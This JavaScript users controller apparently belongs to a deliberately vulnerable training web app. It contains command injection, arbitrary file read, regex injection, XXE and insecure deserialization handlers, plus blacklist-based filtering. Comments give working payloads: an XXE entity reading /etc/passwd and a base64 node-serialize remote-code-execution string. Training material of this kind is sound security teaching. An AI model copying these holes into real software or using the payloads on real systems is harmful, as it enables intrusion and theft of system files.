var UsersModel = require("../models/usersModel");
const {
    custom_sanitizer_regex,
    isFromBlackListOfXSS,
    isFromBlackListOfSqli,
    pingMe,
    readDosAndDonts,
    searchLogs,
    parseXML,
    getDeserializeData
} = require('../utils/utility');

class UsersController {
    constructor() {
        this.usersModel = new UsersModel();
    }
    findUserById(parameter) {
        return new Promise((resolve, reject) => {
            this.usersModel.findUserById([parameter])
                .then((result) => {
                    return resolve(result[0])
                }).catch((err) => {
                    return reject(err);
                });
        });
    }

    authenticateUser(credentials) {
        return new Promise((resolve, reject) => {
            this.usersModel.authenticateUser([credentials.user_email, credentials.password])
                .then((result) => {
                    return resolve(result[0]);
                })
                .catch((err) => {
                    return reject(err);
                });
        });
    }

    updateUserById(user, id) {
        return new Promise((resolve, reject) => {
            this.usersModel.updateUserById([user, id])
                .then(() => {
                    return resolve();
                })
                .catch((err) => {
                    return reject(err);
                });
        });
    }

    searchByName(username) {
        return new Promise((resolve, reject) => {
            this.usersModel.searchByName([username])
                .then((user) => {
                    let htmlResponse = "";
                    if (user != undefined && user != "") {
                        htmlResponse = generateSearchUserResponse(user)
                    } else {
                        htmlResponse = "<p>User " + custom_sanitizer_regex(username) + " not present";
                    }

                    return resolve(htmlResponse);
                })
                .catch((err) => {
                    return reject(err);
                });
        });
    }

    registerUser(user) {
        return new Promise((resolve, reject) => {
            if (user.password == user.cpassword) {
                this.usersModel.registerUser([user])
                    .then(() => {
                        resolve();
                    })
                    .catch((err) => {
                        reject(err);
                    });
            } else {
                reject(new Error("Password does not match to each other"));
            }
        });
    }

    searchUserBlackList(username) {
        return new Promise((resolve, reject) => {
            let htmlResponse = "";
            if (!isFromBlackListOfSqli(username)) {
                this.usersModel.searchByName([username])
                    .then((user) => {
                        if (user != undefined && user != "") {
                            htmlResponse = generateSearchUserResponse(user)
                        } else {
                            htmlResponse = "<p>User " + username + " not present";
                        }

                        return resolve(htmlResponse);
                    })
                    .catch((err) => {
                        return reject(err);
                    });
            } else {
                htmlResponse = "<p>Your input contains malicious values, Please try again</p>";
                return resolve(htmlResponse);
            }
        });
    }

    changePassword(password, userId) {
        return new Promise((resolve, reject) => {
            let htmlResponse = "";
            this.usersModel.changePassword([password, userId])
                .then(() => {
                    htmlResponse = "<p>Your password successfully changed.";
                    return resolve(htmlResponse);
                })
                .catch((err) => {
                    htmlResponse = "<p>Something went wrong, Please try again";
                    return resolve(htmlResponse);
                });

        });
    }

    commandInjection(ip) {
        return new Promise((resolve, reject) => {
            let htmlResponse = "";
            pingMe(ip)
                .then((result) => {
                    htmlResponse = "<p>" + result + "</p>";
                    return resolve(htmlResponse);
                })
                .catch((err) => {
                    htmlResponse = "<p>" + err + "</p>";
                    return reject(htmlResponse);
                });

        });
    }

    arbitraryFileRetrieval(filename) {
        return new Promise((resolve, reject) => {
            let htmlResponse = "";
            readDosAndDonts(filename)
                .then((result) => {
                    htmlResponse = "<p>" + result + "</p>";
                    return resolve(htmlResponse);
                })
                .catch((err) => {
                    htmlResponse = "<p>" + err + "</p>";
                    return reject(htmlResponse);
                });

        });
    }

    regExInjection(search) {
        // bypass: )|(.*
        return new Promise((resolve, reject) => {
            let htmlResponse = "";
            searchLogs(search)
                .then((result) => {
                    htmlResponse = "<p>" + result + "</p>";
                    return resolve(htmlResponse);
                })
                .catch((err) => {
                    htmlResponse = "<p>" + err + "</p>";
                    return reject(htmlResponse);
                });

        });
    }

    xxe(username) {
        return new Promise((resolve, reject) => {
            // payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT user ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><user>&xxe;</user>';
            parseXML(username).then((xmlDoc) => {
                username = xmlDoc.get('/user').text();
                this.usersModel.searchByName([username])
                    .then((user) => {
                        let htmlResponse = "";
                        if (user != undefined && user != "") {
                            htmlResponse = generateSearchUserResponse(user)
                        } else {
                            htmlResponse = "<p>User " + username + " not present";
                        }

                        return resolve(htmlResponse);
                    })
                    .catch((err) => {
                        return reject(err);
                    });
            }).catch((err) => {
                return reject(err);
            });
        });
    }

    deserialization(cookies) {
        // Payload: base64 of {"fullname":"_$$ND_FUNC$$_function (){ return require('child_process').execSync('cat /etc/passwd').toString(); }()"}
        //  Actual payload: eyJmdWxsbmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgcmV0dXJuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnY2F0IC9ldGMvcGFzc3dkJykudG9TdHJpbmcoKTsgfSgpIn0=
        return new Promise((resolve, reject) => {
            getDeserializeData(cookies.user)
                .then((fullname) => {
                    resolve("<h2>Hi,<b>" + fullname + "<b><h2><br>");
                }).catch((err) => {
                    return reject("<h2>Hi,<b>" + err + "<b><h2><br>");
                })
        });

    }
}

module.exports = UsersController;



function generateSearchUserResponse(user) {
    var resString = "<table border='1'>";
    resString += "<tr><th>User Id</th>";
    resString += "<th>Full Name</th>";
    resString += "<th>User Name</th>";
    resString += "<th>Email</th>";
    resString += "<th>Phone</th>";
    resString += "</tr>";

    for (i = 0; i < user.length; i++) {
        resString += "<tr> ";
        resString += "<td>" + user[i].id + "</td> ";
        resString += "<td>" + (isFromBlackListOfXSS(user[i].fullname) ? "" : user[i].fullname) + "</td> ";
        resString += "<td>" + (isFromBlackListOfXSS(user[i].username) ? "" : user[i].username) + "</td> ";
        resString += "<td>" + (isFromBlackListOfXSS(user[i].email) ? "" : user[i].email) + "</td> ";
        resString += "<td>" + (isFromBlackListOfXSS(user[i].phone) ? "" : user[i].phone) + "</td> ";


        resString += "</tr> ";
    }
    resString += "</table>";

    return resString;
}
